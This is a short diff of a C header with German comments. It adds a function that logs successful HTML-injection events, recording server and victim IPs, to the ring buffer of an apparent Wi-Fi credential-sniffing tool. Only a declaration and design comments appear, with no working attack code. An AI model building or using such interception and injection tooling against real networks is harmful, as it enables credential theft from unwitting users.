@@ -41,6 +41,14 @@ void wlan_cred_sniff_free(WlanCredSniff* cs);
  *  nicht gearmt ist (set_armed(false)), ist die Funktion ein No-Op. */
 void wlan_cred_sniff_feed_eth(WlanCredSniff* cs, const uint8_t* eth, uint16_t len);
 
+/** Einen "INJ"-Eintrag in den Ring legen — wird vom wlan_html_inject-Modul
+ *  bei erfolgreichem Inject gerufen. host/path werden über eine kleine
+ *  Per-Flow-Map nachgeschlagen, die beim parse_http für jeden Request
+ *  beschrieben wird. Wenn kein Lookup-Treffer: Server-IP als Host-Fallback.
+ *  Aus dem lwIP-tcpip_thread aufzurufen (single producer). */
+void wlan_cred_sniff_push_inject(
+    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port);
+
 /** Drain für den UI/Tick-Thread (single consumer). Kopiert bis zu max neue
  *  Einträge seit dem letzten Aufruf (ältester zuerst) nach out; liefert deren
  *  Anzahl. Einträge die zwischenzeitlich überschrieben wurden, werden
